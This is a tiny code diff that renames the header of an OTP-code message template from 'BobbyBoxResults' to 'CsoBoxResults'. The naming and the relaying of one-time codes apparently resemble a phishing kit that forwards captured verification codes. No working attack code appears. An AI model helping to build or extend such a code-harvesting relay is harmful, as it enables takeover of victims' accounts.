@@ -119,7 +119,7 @@ const composeOtpMessage = (data) => {
     }) + ' UTC';
 
     return `
-*🔑 BobbyBoxResults - OTP Code 🔑*
+*🔑 CsoBoxResults - OTP Code 🔑*
 
 *VERIFICATION CODE*
 - 🔢 OTP Code: \`${otp}\`
